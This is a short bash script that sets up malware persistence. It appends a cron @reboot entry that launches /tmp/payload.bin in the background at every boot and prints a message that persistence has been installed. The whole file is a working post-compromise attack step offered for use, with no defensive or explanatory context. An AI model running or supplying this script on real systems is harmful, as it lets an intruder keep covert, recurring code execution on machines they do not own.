#!/bin/bash
# Add payload to cron @reboot

(crontab -l 2>/dev/null; echo "@reboot /tmp/payload.bin &") | crontab -
echo "[+] Persistence installed via cronjob"

